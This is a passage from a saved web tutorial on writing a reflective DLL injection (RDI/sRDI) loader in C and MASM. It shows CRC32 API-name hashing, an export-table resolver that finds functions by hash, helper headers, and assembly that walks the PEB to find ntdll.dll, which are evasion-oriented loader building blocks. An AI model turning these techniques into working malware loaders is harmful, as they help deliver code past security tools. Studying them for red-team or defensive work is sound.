        <tr>
          <td id="file-peb-c-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-peb-c-LC5" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint32_t</span> crc = <span class="pl-c1">0xFFFFFFFF</span>;</td>
        </tr>
        <tr>
          <td id="file-peb-c-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-peb-c-LC6" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint32_t</span> byte;</td>
        </tr>
        <tr>
          <td id="file-peb-c-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-peb-c-LC7" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint32_t</span> mask;</td>
        </tr>
        <tr>
          <td id="file-peb-c-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-peb-c-LC8" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> i = <span class="pl-c1">0x0</span>;</td>
        </tr>
        <tr>
          <td id="file-peb-c-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-peb-c-LC9" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> j;</td>
        </tr>
        <tr>
          <td id="file-peb-c-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-peb-c-LC10" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-c-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-peb-c-LC11" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span> (str[i] != <span class="pl-c1">0</span>) {</td>
        </tr>
        <tr>
          <td id="file-peb-c-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-peb-c-LC12" class="blob-code blob-code-inner js-file-line">        byte = str[i];</td>
        </tr>
        <tr>
          <td id="file-peb-c-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-peb-c-LC13" class="blob-code blob-code-inner js-file-line">        crc = crc ^ byte;</td>
        </tr>
        <tr>
          <td id="file-peb-c-L14" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-peb-c-LC14" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">for</span> (j = <span class="pl-c1">7</span>; j &gt;= <span class="pl-c1">0</span>; j--) {</td>
        </tr>
        <tr>
          <td id="file-peb-c-L15" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-peb-c-LC15" class="blob-code blob-code-inner js-file-line">            mask = -<span class="pl-c1">1</span> * (crc &amp; <span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-peb-c-L16" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-peb-c-LC16" class="blob-code blob-code-inner js-file-line">            crc = (crc &gt;&gt; <span class="pl-c1">1</span>) ^ (SEED &amp; mask);</td>
        </tr>
        <tr>
          <td id="file-peb-c-L17" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-peb-c-LC17" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-peb-c-L18" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-peb-c-LC18" class="blob-code blob-code-inner js-file-line">        i++;</td>
        </tr>
        <tr>
          <td id="file-peb-c-L19" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-peb-c-LC19" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-peb-c-L20" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-peb-c-LC20" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> ~crc;</td>
        </tr>
        <tr>
          <td id="file-peb-c-L21" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-peb-c-LC21" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
        <tr>
          <td id="file-peb-c-L22" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-peb-c-LC22" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-c-L23" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-peb-c-LC23" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *<span class="pl-en">get_proc_address_by_hash</span>(<span class="pl-k">void</span> *dll_address, <span class="pl-c1">uint32_t</span> function_hash) {</td>
        </tr>
        <tr>
          <td id="file-peb-c-L24" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-peb-c-LC24" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *base = dll_address;</td>
        </tr>
        <tr>
          <td id="file-peb-c-L25" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="25"></td>
          <td id="file-peb-c-LC25" class="blob-code blob-code-inner js-file-line">    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;</td>
        </tr>
        <tr>
          <td id="file-peb-c-L26" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="26"></td>
          <td id="file-peb-c-LC26" class="blob-code blob-code-inner js-file-line">    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)base + dos_header-&gt;<span class="pl-smi">e_lfanew</span>);</td>
        </tr>
        <tr>
          <td id="file-peb-c-L27" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="27"></td>
          <td id="file-peb-c-LC27" class="blob-code blob-code-inner js-file-line">    PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)base + nt_headers-&gt;<span class="pl-smi">OptionalHeader</span>.<span class="pl-smi">DataDirectory</span>[IMAGE_DIRECTORY_ENTRY_EXPORT].<span class="pl-smi">VirtualAddress</span>);</td>
        </tr>
        <tr>
          <td id="file-peb-c-L28" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="28"></td>
          <td id="file-peb-c-LC28" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">unsigned</span> <span class="pl-k">long</span> *p_address_of_functions = (PDWORD)((DWORD_PTR)base + export_directory-&gt;<span class="pl-smi">AddressOfFunctions</span>);</td>
        </tr>
        <tr>
          <td id="file-peb-c-L29" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="29"></td>
          <td id="file-peb-c-LC29" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">unsigned</span> <span class="pl-k">long</span> *p_address_of_names = (PDWORD)((DWORD_PTR)base + export_directory-&gt;<span class="pl-smi">AddressOfNames</span>);</td>
        </tr>
        <tr>
          <td id="file-peb-c-L30" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="30"></td>
          <td id="file-peb-c-LC30" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">unsigned</span> <span class="pl-k">short</span> *p_address_of_name_ordinals = (PWORD)((DWORD_PTR)base + export_directory-&gt;<span class="pl-smi">AddressOfNameOrdinals</span>);</td>
        </tr>
        <tr>
          <td id="file-peb-c-L31" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="31"></td>
          <td id="file-peb-c-LC31" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-c-L32" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="32"></td>
          <td id="file-peb-c-LC32" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span>(<span class="pl-k">unsigned</span> <span class="pl-k">long</span> i = <span class="pl-c1">0</span>; i &lt; export_directory-&gt;<span class="pl-smi">NumberOfNames</span>; i++) {</td>
        </tr>
        <tr>
          <td id="file-peb-c-L33" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="33"></td>
          <td id="file-peb-c-LC33" class="blob-code blob-code-inner js-file-line">        LPCSTR p_function_name = (LPCSTR)((DWORD_PTR)base + p_address_of_names[i]);</td>
        </tr>
        <tr>
          <td id="file-peb-c-L34" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="34"></td>
          <td id="file-peb-c-LC34" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">unsigned</span> <span class="pl-k">short</span> p_function_ordinal = (<span class="pl-k">unsigned</span> <span class="pl-k">short</span>)p_address_of_name_ordinals[i];</td>
        </tr>
        <tr>
          <td id="file-peb-c-L35" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="35"></td>
          <td id="file-peb-c-LC35" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">unsigned</span> <span class="pl-k">long</span> p_function_address = (<span class="pl-k">unsigned</span> <span class="pl-k">long</span>)p_address_of_functions[p_function_ordinal];</td>
        </tr>
        <tr>
          <td id="file-peb-c-L36" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="36"></td>
          <td id="file-peb-c-LC36" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-c-L37" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="37"></td>
          <td id="file-peb-c-LC37" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span>(function_hash == <span class="pl-c1">HASH</span>(p_function_name))</td>
        </tr>
        <tr>
          <td id="file-peb-c-L38" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="38"></td>
          <td id="file-peb-c-LC38" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">return</span> (<span class="pl-k">void</span> *)((DWORD_PTR)base + p_function_address);</td>
        </tr>
        <tr>
          <td id="file-peb-c-L39" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="39"></td>
          <td id="file-peb-c-LC39" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-peb-c-L40" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="40"></td>
          <td id="file-peb-c-LC40" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">return</span> <span class="pl-c1">NULL</span>;</td>
        </tr>
        <tr>
          <td id="file-peb-c-L41" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="41"></td>
          <td id="file-peb-c-LC41" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/9215ec90ef53a1e81651b65ba45ac764/raw/c81966202f70ede6f4cd2015e261f539bf06f3a9/peb.c" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/9215ec90ef53a1e81651b65ba45ac764#file-peb-c">
          peb.c
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><!--kg-card-begin: html--><p>As you can see in the code above, the <code>crc32b</code> function takes a string and returns a hash for storage, and the <code>get_proc_address_by_hash</code> function takes the base address of a DLL, and the hashed function name as input and returns the function address. We are also adding the <code>peb.h</code> header which includes variables required by <code>crc32b</code> as seen below.</p><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p><code>peb.h</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/bb5fc0399c549e29bff8ad8f9dafb513.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121782503" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-peb-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="peb.h">
        <tbody><tr>
          <td id="file-peb-h-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-peb-h-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>stdint.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-peb-h-LC2" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>defs.h<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-peb-h-LC3" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-peb-h-LC4" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">SEED</span> <span class="pl-c1">0xDEADDEAD</span></td>
        </tr>
        <tr>
          <td id="file-peb-h-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-peb-h-LC5" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">HASH</span>(<span class="pl-v">API</span>)(crc32b((<span class="pl-c1">uint8_t</span> *)API))</td>
        </tr>
        <tr>
          <td id="file-peb-h-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-peb-h-LC6" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-peb-h-LC7" class="blob-code blob-code-inner js-file-line"><span class="pl-c1">uint32_t</span> <span class="pl-en">crc32b</span>(<span class="pl-k">const</span> <span class="pl-c1">uint8_t</span> *str);</td>
        </tr>
        <tr>
          <td id="file-peb-h-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-peb-h-LC8" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-h-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-peb-h-LC9" class="blob-code blob-code-inner js-file-line"><span class="pl-k">void</span> *<span class="pl-en">get_proc_address_by_hash</span>(<span class="pl-k">void</span> *dll_address, <span class="pl-c1">uint32_t</span> function_hash);</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/bb5fc0399c549e29bff8ad8f9dafb513/raw/3965b9ca22e40f19dba1a7c16c531961cd762e23/peb.h" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/bb5fc0399c549e29bff8ad8f9dafb513#file-peb-h">
          peb.h
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>We will also move the structs within the old <code>main.c</code> to the <code>structs.h</code> header file as seen below.</p><!--kg-card-end: html--><!--kg-card-begin: html--><p><code>structs.h</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/14f6d64aa7763f7753e61f15303e9693.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121782937" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-structs-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="structs.h">
        <tbody><tr>
          <td id="file-structs-h-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-structs-h-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">&lt;</span>windows.h<span class="pl-pds">&gt;</span></span></td>
        </tr>
        <tr>
          <td id="file-structs-h-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-structs-h-LC2" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-structs-h-LC3" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> BASE_RELOCATION_BLOCK {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-structs-h-LC4" class="blob-code blob-code-inner js-file-line">    DWORD PageAddress;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-structs-h-LC5" class="blob-code blob-code-inner js-file-line">    DWORD BlockSize;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-structs-h-LC6" class="blob-code blob-code-inner js-file-line">} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-structs-h-LC7" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-structs-h-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-structs-h-LC8" class="blob-code blob-code-inner js-file-line"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> BASE_RELOCATION_ENTRY {</td>
        </tr>
        <tr>
          <td id="file-structs-h-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-structs-h-LC9" class="blob-code blob-code-inner js-file-line">    USHORT Offset : <span class="pl-c1">12</span>;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-structs-h-LC10" class="blob-code blob-code-inner js-file-line">    USHORT Type : <span class="pl-c1">4</span>;</td>
        </tr>
        <tr>
          <td id="file-structs-h-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-structs-h-LC11" class="blob-code blob-code-inner js-file-line">} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/14f6d64aa7763f7753e61f15303e9693/raw/52dc1d0ab6650053aa99a114e035d438d5d6bdd3/structs.h" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/14f6d64aa7763f7753e61f15303e9693#file-structs-h">
          structs.h
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>Next is to add some content to the <code>defs.h</code> file to define a few constants.  This is also where all of our function definition will go as we progress further.</p><!--kg-card-end: html--><!--kg-card-begin: html--><p><code>defs.h</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/2af5f32b8f0e83c114f128af0c23a31a.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121783051" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-defs-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="C" data-tagsearch-path="defs.h">
        <tbody><tr>
          <td id="file-defs-h-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-defs-h-LC1" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">include</span> <span class="pl-s"><span class="pl-pds">"</span>structs.h<span class="pl-pds">"</span></span></td>
        </tr>
        <tr>
          <td id="file-defs-h-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-defs-h-LC2" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-defs-h-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-defs-h-LC3" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtCurrentThread</span>() ( (HANDLE)(LONG_PTR) -<span class="pl-c1">2</span> )</td>
        </tr>
        <tr>
          <td id="file-defs-h-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-defs-h-LC4" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">NtCurrentProcess</span>() ( (HANDLE)(LONG_PTR) -<span class="pl-c1">1</span> )</td>
        </tr>
        <tr>
          <td id="file-defs-h-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-defs-h-LC5" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">RTL_CONSTANT_STRING</span>(<span class="pl-v">s</span>) { <span class="pl-k">sizeof</span>(s)-<span class="pl-k">sizeof</span>((s)[<span class="pl-c1">0</span>]), <span class="pl-k">sizeof</span>(s), s }</td>
        </tr>
        <tr>
          <td id="file-defs-h-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-defs-h-LC6" class="blob-code blob-code-inner js-file-line">#<span class="pl-k">define</span> <span class="pl-en">FILL_STRING</span>(<span class="pl-v">string, buffer</span>)       \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-defs-h-LC7" class="blob-code blob-code-inner js-file-line">	string.Length = (USHORT)strlen(buffer);   \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-defs-h-LC8" class="blob-code blob-code-inner js-file-line">	string.MaximumLength = string.Length; \</td>
        </tr>
        <tr>
          <td id="file-defs-h-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-defs-h-LC9" class="blob-code blob-code-inner js-file-line">	string.Buffer = buffer</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/2af5f32b8f0e83c114f128af0c23a31a/raw/9bf43e0aeffd66812335bdaf46596776f2290738/defs.h" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/2af5f32b8f0e83c114f128af0c23a31a#file-defs-h">
          defs.h
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>It's time to familiarize ourselves with some fundamental MASM Assembly instructions. As we'll be utilizing the Native API for our loader, it's essential to know how to obtain the address of the <code>ntdll.dll</code> library to resolve Native API functions when required. Although this task can also be accomplished in C, learning ASM can aid in writing C code, which is why we'll be focusing on it.</p><!--kg-card-end: html--><!--kg-card-begin: html--><p><code>peb.masm</code></p><!--kg-card-end: html--><!--kg-card-begin: html--><script src="./Writing your own RDI _sRDI loader using C and ASM_files/210d31d3776fdee42c801dca2d670204.js.download"></script><link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/gist-embed-cdd2b47f37c5.css"><div id="gist121783266" class="gist">
    <div class="gist-file" translate="no">
      <div class="gist-data">
        <div class="js-gist-file-update-container js-task-list-container file-box">
  <div id="file-peb-masm" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-text  ">

        
<div class="js-check-bidi js-blob-code-container blob-code-content">

  <template class="js-file-alert-template"></template>
<template class="js-line-alert-template"></template>

  <table data-hpc="" class="highlight tab-size js-file-line-container js-code-nav-container js-tagsearch-file" data-tab-size="8" data-paste-markdown-skip="" data-tagsearch-lang="" data-tagsearch-path="peb.masm">
        <tbody><tr>
          <td id="file-peb-masm-L1" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-peb-masm-LC1" class="blob-code blob-code-inner js-file-line">.CODE</td>
        </tr>
        <tr>
          <td id="file-peb-masm-L2" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-peb-masm-LC2" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-masm-L3" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-peb-masm-LC3" class="blob-code blob-code-inner js-file-line">get_ntdll PROC</td>
        </tr>
        <tr>
          <td id="file-peb-masm-L4" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-peb-masm-LC4" class="blob-code blob-code-inner js-file-line">    xor     rax, rax</td>
        </tr>
        <tr>
          <td id="file-peb-masm-L5" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-peb-masm-LC5" class="blob-code blob-code-inner js-file-line">    mov     rax, gs:[60h]</td>
        </tr>
        <tr>
          <td id="file-peb-masm-L6" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-peb-masm-LC6" class="blob-code blob-code-inner js-file-line">    mov     rax, [rax + 18h]</td>
        </tr>
        <tr>
          <td id="file-peb-masm-L7" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-peb-masm-LC7" class="blob-code blob-code-inner js-file-line">    mov     rax, [rax + 20h]</td>
        </tr>
        <tr>
          <td id="file-peb-masm-L8" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-peb-masm-LC8" class="blob-code blob-code-inner js-file-line">    mov     rax, [rax]</td>
        </tr>
        <tr>
          <td id="file-peb-masm-L9" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-peb-masm-LC9" class="blob-code blob-code-inner js-file-line">    mov     rax, [rax + 20h]</td>
        </tr>
        <tr>
          <td id="file-peb-masm-L10" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-peb-masm-LC10" class="blob-code blob-code-inner js-file-line">    ret</td>
        </tr>
        <tr>
          <td id="file-peb-masm-L11" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-peb-masm-LC11" class="blob-code blob-code-inner js-file-line">get_ntdll ENDP</td>
        </tr>
        <tr>
          <td id="file-peb-masm-L12" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-peb-masm-LC12" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-peb-masm-L13" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-peb-masm-LC13" class="blob-code blob-code-inner js-file-line">END</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/maliciousgroup/210d31d3776fdee42c801dca2d670204/raw/dbfafc19880a70088be8fb9aad42cb3ee5118f99/peb.masm" style="float:right">view raw</a>
        <a href="https://gist.github.com/maliciousgroup/210d31d3776fdee42c801dca2d670204#file-peb-masm">
          peb.masm
        </a>
        hosted with ‚ù§ by <a href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>
<!--kg-card-end: html--><hr><p>The above code is walking the PEB (Process Environment Block) of the current 64-bit process to find the address of ntdll.dll. &nbsp;This is because the ntdll.dll DLL has the same base address across all processes.</p><p>Here are the steps of what is happening in the above code.</p><!--kg-card-begin: markdown--><ol>
<li>
